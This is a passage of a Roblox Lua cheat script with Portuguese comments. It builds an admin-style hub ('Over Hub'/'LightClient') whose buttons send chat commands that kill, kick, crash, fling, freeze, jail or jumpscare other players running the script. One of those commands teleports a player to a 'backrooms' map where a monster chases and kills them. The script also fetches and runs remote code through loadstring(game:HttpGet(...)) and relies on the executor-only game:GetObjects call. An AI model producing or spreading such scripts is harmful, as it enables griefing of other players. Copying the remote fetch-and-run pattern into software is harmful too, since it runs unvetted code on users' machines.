    screenGui.Name = "MonsterJumpscare"
    screenGui.IgnoreGuiInset = true
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local imageLabel = Instance.new("ImageLabel", screenGui)
    imageLabel.Size = UDim2.new(1, 0, 1, 0)
    imageLabel.Position = UDim2.new(0, 0, 0, 0)
    imageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
    imageLabel.BackgroundTransparency = 0
    imageLabel.Image = "rbxassetid://126754882337711"
    imageLabel.ScaleType = Enum.ScaleType.Fit
    imageLabel.ImageTransparency = 1
    
    -- Som do jumpscare
    local scareSound = Instance.new("Sound")
    scareSound.SoundId = "rbxassetid://138873214826309"
    scareSound.Volume = 2.5
    scareSound.Looped = false
    scareSound.Parent = screenGui
    
    -- AnimaÃ§Ã£o do jumpscare
    coroutine.wrap(function()
        imageLabel.ImageTransparency = 0
        scareSound:Play()
        
        -- Efeito de pulsaÃ§Ã£o
        for i = 1, 6 do
            imageLabel.Size = UDim2.new(1.1, 0, 1.1, 0)
            wait(0.1)
            imageLabel.Size = UDim2.new(1, 0, 1, 0)
            wait(0.1)
        end
        
        -- Fade out
        for i = 1, 10 do
            imageLabel.ImageTransparency = i / 10
            wait(0.05)
        end
        
        scareSound:Stop()
        screenGui:Destroy()
    end)()
    
    -- Mensagem de alerta
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "ðŸ’€ O MONSTRO DAS BACKROOMS TE VIU! FUJA!",
        Color = Color3.fromRGB(255, 0, 0),
        Font = Enum.Font.GothamBold
    })
    
    -- Sistema de perseguiÃ§Ã£o
    while monsterActive and player.Character and player.Character:FindFirstChild("HumanoidRootPart") do
        local playerPos = player.Character.HumanoidRootPart.Position
        local monsterPos = monsterBody.Position
        
        -- Calcular direÃ§Ã£o para o jogador
        local direction = (playerPos - monsterPos).Unit
        local newPosition = monsterPos + (direction * 2.5)
        
        -- Atualizar posiÃ§Ã£o do monstro
        monsterBody.Position = newPosition
        
        -- Fazer o monstro sempre olhar para o jogador
        monsterBody.CFrame = CFrame.new(newPosition, playerPos)
        
        -- Verificar se o monstro alcanÃ§ou o jogador
        if (playerPos - newPosition).Magnitude < 8 then
            -- Efeito visual antes de matar
            local killEffect = Instance.new("Part")
            killEffect.Size = Vector3.new(10, 10, 10)
            killEffect.Position = playerPos
            killEffect.Anchored = true
            killEffect.CanCollide = false
            killEffect.Material = Enum.Material.Neon
            killEffect.BrickColor = BrickColor.new("Really red")
            killEffect.Transparency = 0.7
            killEffect.Parent = workspace
            
            local killLight = Instance.new("PointLight")
            killLight.Brightness = 15
            killLight.Range = 15
            killLight.Color = Color3.fromRGB(255, 0, 0)
            killLight.Parent = killEffect
            
            -- Matar o jogador
            if player.Character then
                player.Character:BreakJoints()
                
                -- Som de morte
                local deathSound = Instance.new("Sound")
                deathSound.SoundId = "rbxassetid://143942090"
                deathSound.Volume = 1.5
                deathSound.Parent = workspace
                deathSound:Play()
                
                game:GetService("Debris"):AddItem(deathSound, 3)
                game:GetService("Debris"):AddItem(killEffect, 2)
                
                -- Mensagem de morte
                StarterGui:SetCore("ChatMakeSystemMessage", {
                    Text = "ðŸ’€ O MONSTRO DAS BACKROOMS TE PEGOU! VOCÃŠ MORREU!",
                    Color = Color3.fromRGB(255, 0, 0),
                    Font = Enum.Font.GothamBold
                })
                
                break
            end
        end
        
        wait(0.1)
    end
end

-- ===== FUNÃ‡ÃƒO PARA DESATIVAR O MONSTRO =====
local function DeactivateMonster()
    monsterActive = false
    if backroomsMonster then
        backroomsMonster:Destroy()
        backroomsMonster = nil
    end
end

-- ===== FUNÃ‡ÃƒO PARA CRIAR BACKROOMS COM MAPA ESPECÃFICO =====
local function CreateBackrooms()
    local backroomsFolder = workspace:FindFirstChild("LightClient_Backrooms")
    if backroomsFolder then
        backroomsFolder:Destroy()
    end
    
    backroomsFolder = Instance.new("Folder")
    backroomsFolder.Name = "LightClient_Backrooms"
    backroomsFolder.Parent = workspace
    
    -- Carregar mapa das Backrooms (ID: 10581711055)
    local mapID = 10581711055
    local distantPosition = Vector3.new(0, 10000, 0)
    local teleportPosition = Vector3.new(59.06, 9996.70, 19.42)
    
    local success, mapa = pcall(function()
        return game:GetObjects("rbxassetid://"..mapID)[1]
    end)
    
    if success and mapa then
        mapa.Parent = backroomsFolder
        mapa.Name = "BackroomsMap"
        
        -- Configurar posiÃ§Ã£o do mapa
        if not mapa.PrimaryPart then
            local part = mapa:FindFirstChildWhichIsA("BasePart")
            if part then 
                mapa.PrimaryPart = part 
            end
        end
        
        if mapa.PrimaryPart then
            mapa:SetPrimaryPartCFrame(CFrame.new(distantPosition))
        else
            -- Se nÃ£o tiver PrimaryPart, mover todas as partes
            for _, part in ipairs(mapa:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Position = part.Position + distantPosition
                end
            end
        end
        
        -- Aplicar iluminaÃ§Ã£o das backrooms
        local lighting = game:GetService("Lighting")
        lighting.Brightness = 0.6
        lighting.Ambient = Color3.fromRGB(255, 200, 100)
        lighting.OutdoorAmbient = Color3.fromRGB(255, 200, 100)
        lighting.FogColor = Color3.fromRGB(255, 200, 100)
        lighting.FogEnd = 250
        lighting.FogStart = 50
        
        -- Adicionar efeitos sonoros
        local humSound = Instance.new("Sound")
        humSound.SoundId = "rbxassetid://9114825996"
        humSound.Volume = 0.6
        humSound.Looped = true
        humSound.Parent = backroomsFolder
        humSound:Play()
        
        return backroomsFolder, teleportPosition
    else
        -- Fallback: criar backrooms manualmente se o mapa nÃ£o carregar
        local basePosition = Vector3.new(0, -500, 0)
        local roomSize = 100
        local wallHeight = 20
        
        local function createRoom(roomPosition, roomName)
            local roomFolder = Instance.new("Folder")
            roomFolder.Name = roomName
            roomFolder.Parent = backroomsFolder
            
            local function createWall(position, size, name)
                local wall = Instance.new("Part")
                wall.Name = name
                wall.Size = size
                wall.Position = roomPosition + position
                wall.Anchored = true
                wall.CanCollide = true
                wall.Material = Enum.Material.Plastic
                wall.BrickColor = BrickColor.new("Br. yellowish orange")
                wall.Parent = roomFolder
                return wall
            end
            
            -- Piso
            local floor = createWall(Vector3.new(0, 0, 0), Vector3.new(roomSize, 1, roomSize), "Floor")
            
            -- Teto
            local ceiling = createWall(Vector3.new(0, wallHeight, 0), Vector3.new(roomSize, 1, roomSize), "Ceiling")
            ceiling.BrickColor = BrickColor.new("Dark orange")
            
            -- Paredes
            createWall(Vector3.new(-roomSize/2, wallHeight/2, 0), Vector3.new(2, wallHeight, roomSize), "WestWall")
            createWall(Vector3.new(roomSize/2, wallHeight/2, 0), Vector3.new(2, wallHeight, roomSize), "EastWall")
            createWall(Vector3.new(0, wallHeight/2, -roomSize/2), Vector3.new(roomSize, wallHeight, 2), "NorthWall")
            createWall(Vector3.new(0, wallHeight/2, roomSize/2), Vector3.new(roomSize, wallHeight, 2), "SouthWall")
            
            return roomFolder
        end
        
        -- Criar sala central
        local centralRoom = createRoom(basePosition, "CentralRoom")
        teleportPosition = basePosition + Vector3.new(0, 5, 0)
        
        return backroomsFolder, teleportPosition
    end
end

-- ===== FUNÃ‡ÃƒO PARA TEletransportar PARA BACKROOMS =====
local function TeleportToBackrooms(player)
    if not player or not player.Character then
        return false
    end
    
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then
        return false
    end
    
    -- Criar backrooms
    local backroomsFolder, spawnPosition = CreateBackrooms()
    
    -- Efeito visual de transiÃ§Ã£o
    local transitionEffect = Instance.new("Part")
    transitionEffect.Name = "BackroomsTransition"
    transitionEffect.Size = Vector3.new(8, 8, 8)
    transitionEffect.Position = humanoidRootPart.Position
    transitionEffect.Anchored = true
    transitionEffect.CanCollide = false
    transitionEffect.Material = Enum.Material.Neon
    transitionEffect.BrickColor = BrickColor.new("Bright yellow")
    transitionEffect.Transparency = 0.3
    transitionEffect.Parent = workspace
    
    local transitionLight = Instance.new("PointLight")
    transitionLight.Brightness = 8
    transitionLight.Range = 12
    transitionLight.Color = Color3.fromRGB(255, 255, 150)
    transitionLight.Parent = transitionEffect
    
    -- AnimaÃ§Ã£o de teletransporte
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = TweenService:Create(transitionEffect, tweenInfo, {Size = Vector3.new(15, 15, 15), Transparency = 0.8})
    tween:Play()
    
    -- Teletransportar jogador para as backrooms
    humanoidRootPart.CFrame = CFrame.new(spawnPosition)
    
    -- Remover efeito apÃ³s 1 segundo
    game:GetService("Debris"):AddItem(transitionEffect, 1)
    
    -- Ativar o monstro apÃ³s 3 segundos
    task.wait(3)
    ActivateMonster(player)
    
    return true
end

-- ===== FUNÃ‡ÃƒO PARA RESTAURAR MUNDO NORMAL =====
local function RestoreNormalWorld()
    -- Desativar monstro
    DeactivateMonster()
    
    -- Remover backrooms
    local backroomsFolder = workspace:FindFirstChild("LightClient_Backrooms")
    if backroomsFolder then
        backroomsFolder:Destroy()
    end
    
    -- Restaurar configuraÃ§Ãµes de iluminaÃ§Ã£o originais
    local lighting = game:GetService("Lighting")
    lighting.Brightness = 2
    lighting.Ambient = Color3.fromRGB(128, 128, 128)
    lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
    lighting.FogColor = Color3.fromRGB(191, 191, 191)
    lighting.FogEnd = 100000
    lighting.FogStart = 0
end

-- ===== CARREGAR WINDUI =====
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

-- ===== CRIAR JANELA =====
local Window = WindUI:CreateWindow({
    Title = "Over Hub",
    Icon = "terminal",
    Author = "By Over",
    Folder = "DemonClient",
    Size = UDim2.fromOffset(330, 240),
    Transparent = true,
    Theme = "Dark",
    Resizable = true,
    SideBarWidth = 200,
    Background = "728316102835",
    BackgroundImageTransparency = 0.10,
    HideSearchBar = true,
    ScrollBarEnabled = false
})

Window:EditOpenButton({
    Title = "Over Hub",
    Icon = "terminal",
    CornerRadius = UDim.new(0,16),
    StrokeThickness = 2,
    Color = ColorSequence.new(
        Color3.fromHex("800080"),
        Color3.fromHex("4B0082")
    ),
    OnlyMobile = false,
    Enabled = true,
    Draggable = true,
})

-- ===== ABA PRINCIPAL =====
local MainTab = Window:Tab({
    Title = "Principal",
    Icon = "home",
    Locked = false,
})

-- ===== SEÃ‡ÃƒO VERIFICAÃ‡ÃƒO =====
local VerifySection = MainTab:Section({
    Title = "VerificaÃ§Ã£o",
    Desc = "Sistema de verificaÃ§Ã£o do PhantomClient"
})

-- BotÃ£o Verifique
local VerifyButton = VerifySection:Button({
    Title = "Verifique",
    Icon = "check",
    Callback = function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local textChannel = TextChatService.TextChannels.RBXGeneral
            if textChannel then
                textChannel:SendAsync(";verifique")
                WindUI:Notify("VerificaÃ§Ã£o", "Comando ;verifique enviado no chat!")
            end
        else
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(";verifique", "All")
            WindUI:Notify("VerificaÃ§Ã£o", "Comando ;verifique enviado no chat!")
        end
    end
})

-- ===== ABA COMANDOS BÃSICOS =====
local BasicCommandsTab = Window:Tab({
    Title = "Comandos BÃ¡sicos",
    Icon = "zap",
    Locked = false,
})

-- VariÃ¡veis para seleÃ§Ã£o mÃºltipla
local playerNames = {}
local selectedPlayers = {}

-- Preencher lista de jogadores inicial
for _, plr in ipairs(Players:GetPlayers()) do
    table.insert(playerNames, plr.Name)
end

-- SeÃ§Ã£o SeleÃ§Ã£o de Jogadores
local SelectionSection = BasicCommandsTab:Section({
    Title = "SeleÃ§Ã£o de Jogadores",
    Desc = "Selecione os jogadores para os comandos"
})

-- Dropdown de seleÃ§Ã£o mÃºltipla
local Dropdown = SelectionSection:Dropdown({
    Title = "Selecionar Jogadores",
    Values = playerNames,
    Value = {},
    Multi = true,
    AllowNone = true,
    Callback = function(newSelectedPlayers)
        selectedPlayers = newSelectedPlayers
        print("Jogadores selecionados: " .. table.concat(selectedPlayers, ", "))
    end
})

-- Atualiza lista automaticamente quando entra ou sai jogador
Players.PlayerAdded:Connect(function(plr)
    table.insert(playerNames, plr.Name)
    Dropdown:SetValues(playerNames)
end)

Players.PlayerRemoving:Connect(function(plr)
    for i, name in ipairs(playerNames) do
        if name == plr.Name then
            table.remove(playerNames, i)
            break
        end
    end
    Dropdown:SetValues(playerNames)
end)

-- FunÃ§Ã£o para enviar comandos
local function SendCommand(msg)
    local tcs = game:GetService("TextChatService")
    if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
        local channel = tcs.TextChannels.RBXGeneral
        if channel then
            channel:SendAsync(msg)
        end
    else
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
    end
end

-- SeÃ§Ã£o AÃ§Ãµes BÃ¡sicas
local BasicActionsSection = BasicCommandsTab:Section({
    Title = "AÃ§Ãµes BÃ¡sicas",
    Desc = "Comandos fundamentais"
})

-- BotÃµes de comandos bÃ¡sicos
local KillButton = BasicActionsSection:Button({
    Title = "Kill",
    Icon = "skull",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";kill " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("Kill", "Comando executado em " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
        end
    end
})

local KickButton = BasicActionsSection:Button({
    Title = "Kick", 
    Icon = "door-open",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";kick " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("Kick", "Comando executado em " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
        end
    end
})

local CrashButton = BasicActionsSection:Button({
    Title = "Crash",
    Icon = "alert-triangle", 
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";crash " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("Crash", "Comando executado em " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
        end
    end
})

-- SeÃ§Ã£o Movimento
local MovementSection = BasicCommandsTab:Section({
    Title = "Controle de Movimento",
    Desc = "Comandos de movimento e posiÃ§Ã£o"
})

local BringButton = MovementSection:Button({
    Title = "ðŸŽ¯ BRING",
    Icon = "move",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";bring " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("BRING", "ðŸŽ¯ Puxando " .. #selectedPlayers .. " jogador(es) para vocÃª!")
        else
            WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
        end
    end
})

local FlingButton = MovementSection:Button({
    Title = "ðŸš€ FLING",
    Icon = "rocket",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";fling " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("FLING", "ðŸš€ Jogando " .. #selectedPlayers .. " jogador(es) pro VOID!")
        else
            WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
        end
    end
})

-- ===== ABA CONTROLE =====
local ControlTab = Window:Tab({
    Title = "Controle",
    Icon = "lock",
    Locked = false,
})

-- SeÃ§Ã£o Congelamento
local FreezeSection = ControlTab:Section({
    Title = "Controle de Movimento",
    Desc = "Congelar e descongelar jogadores"
})

local FreezeButton = FreezeSection:Button({
    Title = "â„ï¸ FREEZE",
    Icon = "snowflake",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";freeze " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("FREEZE", "â„ï¸ Congelando " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
        end
    end
})

local UnfreezeButton = FreezeSection:Button({
    Title = "ðŸ”¥ UNFREEZE",
    Icon = "flame",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";unfreeze " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("UNFREEZE", "ðŸ”¥ Descongelando " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
        end
    end
})

-- SeÃ§Ã£o PrisÃ£o
local JailSection = ControlTab:Section({
    Title = "Sistema de PrisÃ£o",
    Desc = "Prender e libertar jogadores"
})

local JailButton = JailSection:Button({
    Title = "âš« JAIL",
    Icon = "lock",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";jail " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("JAIL", "âš« Prendendo " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
        end
    end
})

local UnjailButton = JailSection:Button({
    Title = "âšª UNJAIL",
    Icon = "unlock",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";unjail " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("UNJAIL", "âšª Soltando " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
        end
    end
})

-- ===== ABA EFEITOS =====
local EffectsTab = Window:Tab({
    Title = "Efeitos",
    Icon = "star",
    Locked = false,
})

-- SeÃ§Ã£o ExplosÃµes
local ExplosionSection = EffectsTab:Section({
    Title = "Efeitos Visuais",
    Desc = "Efeitos especiais e explosÃµes"
})

local ExplodeButton = ExplosionSection:Button({
    Title = "ðŸ’¥ EXPLODIR",
    Icon = "bomb",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";explodir " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("EXPLOSÃƒO", "ðŸ’¥ BOOM! Comando executado em " .. #selectedPlayers .. " jogador(es)!")
        else
            WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
        end
    end
})

-- SeÃ§Ã£o Backrooms
local BackroomsSection = EffectsTab:Section({
    Title = "Sistema Backrooms",
    Desc = "Teletransportar para as Backrooms"
})

local BackroomsButton = BackroomsSection:Button({
    Title = "ðŸšª BACKROOMS",
    Icon = "door-open",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";backrooms " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("BACKROOMS", "ðŸšª Enviando " .. #selectedPlayers .. " jogador(es) para as Backrooms! CUIDADO COM O MONSTRO! ðŸ’€")
        else
            WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
        end
    end
})

local UnbackroomsButton = BackroomsSection:Button({
    Title = "ðŸ  VOLTAR DO BACKROOMS",
    Icon = "home",
    Callback = function()
        if #selectedPlayers > 0 then
            for _, playerName in ipairs(selectedPlayers) do
                local mensagem = ";unbackrooms " .. playerName
                SendCommand(mensagem)
            end
            WindUI:Notify("BACKROOMS", "ðŸ  Retornando " .. #selectedPlayers .. " jogador(es) do Backrooms!")
        else
            WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
        end
    end
})

-- SeÃ§Ã£o Jumpscares
local JumpscareSection = EffectsTab:Section({
    Title = "Sistema de Jumpscares",
    Desc = "Sustos e efeitos assustadores"
})

-- BotÃµes dos Jumpscares
for _, jumpscare in ipairs(JUMPSCARES) do
    local JumpscareButton = JumpscareSection:Button({
        Title = jumpscare.Name,
        Icon = "alert-triangle",
        Callback = function()
            if #selectedPlayers > 0 then
                for _, playerName in ipairs(selectedPlayers) do
                    local mensagem = jumpscare.Name .. " " .. playerName
                    SendCommand(mensagem)
                end
                WindUI:Notify("Jumpscare", jumpscare.Name .. " enviado para " .. #selectedPlayers .. " jogador(es)!")
            else
                WindUI:Notify("Erro", "âŒ Selecione jogadores primeiro!")
            end
        end
    })
end

-- ===== ABA TAGS =====
local TagsTab = Window:Tab({
    Title = "Tags",
    Icon = "tag",
    Locked = false,
})

-- SeÃ§Ã£o Controle de Tags
local TagsSection = TagsTab:Section({
    Title = "Controle de Tags",
    Desc = "Ativar e desativar tags dos jogadores"
})

-- VariÃ¡vel para controle de tags
local tagsVisiveis = true

-- BotÃ£o Ativar Todas as Tags
local TagAllButton = TagsSection:Button({
    Title = "ðŸ·ï¸ ATIVAR TODAS TAGS",
    Icon = "eye",
    Callback = function()
        tagsVisiveis = true
        SendCommand(";tag all")
        WindUI:Notify("Tags", "ðŸ·ï¸ Todas as tags foram ativadas!")
        
        for _, player in ipairs(Players:GetPlayers()) do
            applyTag(player)
        end
    end
})

-- BotÃ£o Remover Todas as Tags
local UntagAllButton = TagsSection:Button({
    Title = "ðŸš« REMOVER TODAS TAGS",
    Icon = "eye-off",
    Callback = function()
        tagsVisiveis = false
        SendCommand(";untag all")
        WindUI:Notify("Tags", "ðŸš« Todas as tags foram removidas!")
        
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head
                local tag = head:FindFirstChild("SpecialTag")
                if tag then
                    tag:Destroy()
                end
            end
        end
    end
})

-- BotÃ£o Ativar Minha Tag
local TagMeButton = TagsSection:Button({
    Title = "ðŸ‘¤ ATIVAR MINHA TAG",
    Icon = "user",
    Callback = function()
        tagsVisiveis = true
        SendCommand(";tag")
        WindUI:Notify("Tags", "ðŸ‘¤ Sua tag foi ativada!")
        applyTag(LocalPlayer)
    end
})

-- BotÃ£o Remover Minha Tag
local UntagMeButton = TagsSection:Button({
    Title = "ðŸ™ˆ REMOVER MINHA TAG",
    Icon = "user-x",
    Callback = function()
        SendCommand(";untag")
        WindUI:Notify("Tags", "ðŸ™ˆ Sua tag foi removida!")
        
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head") then
            local head = LocalPlayer.Character.Head
            local tag = head:FindFirstChild("SpecialTag")
            if tag then
                tag:Destroy()
            end
        end
    end
})

-- ===== SISTEMA DE COMANDOS =====
local function ProcessarComando(mensagem)
    if string.sub(mensagem, 1, 1) == ";" then
        local partes = string.split(string.sub(mensagem, 2), " ")
        local comando = partes[1]:lower()
        local nomeAlvo = table.concat(partes, " ", 2)
        
        -- Verifica se o comando Ã© para ESTE jogador
        local isSelfTarget = nomeAlvo and (nomeAlvo:lower() == LocalPlayer.Name:lower() or nomeAlvo:lower() == LocalPlayer.DisplayName:lower())
        local playerName = LocalPlayer.Name
        local character = LocalPlayer.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        
        if isSelfTarget then
            print("ðŸŽ¯ Comando recebido: " .. comando .. " para " .. LocalPlayer.Name)
            
            -- Comandos de Tags
            if comando == "untag" then
                tagsVisiveis = false
                if character and character:FindFirstChild("Head") then
                    local head = character.Head
                    local tag = head:FindFirstChild("SpecialTag")
                    if tag then
                        tag:Destroy()
                    end
                end
                StarterGui:SetCore("ChatMakeSystemMessage", {
                    Text = "[LightClient] Tags removidas para " .. LocalPlayer.Name,
                    Color = Color3.fromRGB(170, 0, 255),
                    Font = Enum.Font.GothamBold
                })
                return
            end

            if comando == "tag" then
                tagsVisiveis = true
                applyTag(LocalPlayer)
                StarterGui:SetCore("ChatMakeSystemMessage", {
                    Text = "[LightClient] Tags restauradas para " .. LocalPlayer.Name,
                    Color = Color3.fromRGB(170, 0, 255),
                    Font = Enum.Font.GothamBold
                })
                return
            end

            -- Freeze  
            if comando == "freeze" then  
                if humanoid then  
                    playerOriginalSpeed[playerName] = humanoid.WalkSpeed  
                    humanoid.WalkSpeed = 0  
                    print("â„ï¸ FREEZE executado em " .. LocalPlayer.Name)
                end  
                return  
            end  

            -- Unfreeze  
            if comando == "unfreeze" then  
                if humanoid then  
                    humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16  
                    playerOriginalSpeed[playerName] = nil  
                    print("ðŸ”¥ UNFREEZE executado em " .. LocalPlayer.Name)
                end  
                return  
            end  

            -- Jail  
            if comando == "jail" then  
                if character then  
                    local root = character:FindFirstChild("HumanoidRootPart")  
                    local humanoid = character:FindFirstChildOfClass("Humanoid")  
                    if root and humanoid then  
                        playerOriginalSpeed[playerName] = humanoid.WalkSpeed  
                        humanoid.WalkSpeed = 0  

                        local size = 12
                        local pos = root.Position  
                        jaulas[playerName] = {}  
                        
                        -- FunÃ§Ã£o para criar barras elegantes PRETO E BRANCO
                        local function criarBarra(cframe, size, color)
                            local p = Instance.new("Part")
                            p.Name = "LightClientJailBar"
                            p.Size = size
                            p.Anchored = true
                            p.CanCollide = true
                            p.Material = Enum.Material.Neon
                            p.BrickColor = color
                            p.Reflectance = 0.2
                            p.CFrame = cframe
                            p.Parent = workspace
                            
                            local pointLight = Instance.new("PointLight")
                            pointLight.Brightness = 3
                            pointLight.Range = 8
                            pointLight.Color = color == BrickColor.new("Really black") and Color3.new(0, 0, 0) or Color3.new(1, 1, 1)
                            pointLight.Parent = p
                            
                            table.insert(jaulas[playerName], p)
                            return p
                        end

                        -- BARRAS VERTICAIS PRETAS (Cantos)
                        criarBarra(CFrame.new(pos + Vector3.new(size/2, 0, size/2)), Vector3.new(0.8, size, 0.8), BrickColor.new("Really black"))
                        criarBarra(CFrame.new(pos + Vector3.new(-size/2, 0, size/2)), Vector3.new(0.8, size, 0.8), BrickColor.new("Really black"))
                        criarBarra(CFrame.new(pos + Vector3.new(size/2, 0, -size/2)), Vector3.new(0.8, size, 0.8), BrickColor.new("Really black"))
                        criarBarra(CFrame.new(pos + Vector3.new(-size/2, 0, -size/2)), Vector3.new(0.8, size, 0.8), BrickColor.new("Really black"))

                        -- BARRAS HORIZONTAIS SUPERIORES BRANCAS
                        criarBarra(CFrame.new(pos + Vector3.new(0, size/2, size/2)), Vector3.new(size, 0.8, 0.8), BrickColor.new("Institutional white"))
                        criarBarra(CFrame.new(pos + Vector3.new(0, size/2, -size/2)), Vector3.new(size, 0.8, 0.8), BrickColor.new("Institutional white"))
                        criarBarra(CFrame.new(pos + Vector3.new(size/2, size/2, 0)), Vector3.new(0.8, 0.8, size), BrickColor.new("Institutional white"))
                        criarBarra(CFrame.new(pos + Vector3.new(-size/2, size/2, 0)), Vector3.new(0.8, 0.8, size), BrickColor.new("Institutional white"))

                        -- BARRAS HORIZONTAIS INFERIORES BRANCAS
                        criarBarra(CFrame.new(pos + Vector3.new(0, -size/2, size/2)), Vector3.new(size, 0.8, 0.8), BrickColor.new("Institutional white"))
                        criarBarra(CFrame.new(pos + Vector3.new(0, -size/2, -size/2)), Vector3.new(size, 0.8, 0.8), BrickColor.new("Institutional white"))
                        criarBarra(CFrame.new(pos + Vector3.new(size/2, -size/2, 0)), Vector3.new(0.8, 0.8, size), BrickColor.new("Institutional white"))
                        criarBarra(CFrame.new(pos + Vector3.new(-size/2, -size/2, 0)), Vector3.new(0.8, 0.8, size), BrickColor.new("Institutional white"))

                        if jailConnections[playerName] then  
                            jailConnections[playerName]:Disconnect()  
                        end  
                          
                        jailConnections[playerName] = RunService.Heartbeat:Connect(function()  
                            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then  
                                local hrp = LocalPlayer.Character.HumanoidRootPart  
                                local center = pos + Vector3.new(0, 0, 0)  
                                if (hrp.Position - center).Magnitude > size/2 - 1 then  
                                    hrp.CFrame = CFrame.new(center)  
                                end  
                            end  
                        end)  

                        print("âš« JAIL PRETO E BRANCO executado em " .. LocalPlayer.Name)
                    end  
                end  
                return  
            end  

            -- Unjail  
            if comando == "unjail" then  
                if character then  
                    local humanoid = character:FindFirstChildOfClass("Humanoid")  
                    if humanoid then  
                        humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16  
                        playerOriginalSpeed[playerName] = nil  
                    end  

                    if jaulas[playerName] then  
                        for _, p in ipairs(jaulas[playerName]) do  
                            if p and p.Parent then  
                                p:Destroy()  
                            end  
                        end  
                        jaulas[playerName] = nil  
                        print("âœ… Quadrado 3D do Jail removido do mapa!")
                    end  

                    if jailConnections[playerName] then  
                        jailConnections[playerName]:Disconnect()  
                        jailConnections[playerName] = nil  
                    end  
                    print("âšª UNJAIL executado em " .. LocalPlayer.Name)
                end  
                return  
            end

            -- Backrooms - SISTEMA ATUALIZADO
            if comando == "backrooms" then
                local player = LocalPlayer
                local mapID = 10581711055
                local distantPosition = Vector3.new(0, 10000, 0)
                local teleportPosition = Vector3.new(59.06, 9996.70, 19.42)

                -- Efeito visual de transiÃ§Ã£o
                local transitionEffect = Instance.new("Part")
                transitionEffect.Name = "BackroomsTransition"
                transitionEffect.Size = Vector3.new(8, 8, 8)
                transitionEffect.Position = humanoidRootPart.Position
                transitionEffect.Anchored = true
                transitionEffect.CanCollide = false
                transitionEffect.Material = Enum.Material.Neon
                transitionEffect.BrickColor = BrickColor.new("Bright yellow")
                transitionEffect.Transparency = 0.3
                transitionEffect.Parent = workspace
                
                local transitionLight = Instance.new("PointLight")
                transitionLight.Brightness = 8
                transitionLight.Range = 12
                transitionLight.Color = Color3.fromRGB(255, 255, 150)
                transitionLight.Parent = transitionEffect
                
                -- AnimaÃ§Ã£o de teletransporte
                local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                local tween = TweenService:Create(transitionEffect, tweenInfo, {Size = Vector3.new(15, 15, 15), Transparency = 0.8})
                tween:Play()
                
                -- Carregar mapa das Backrooms
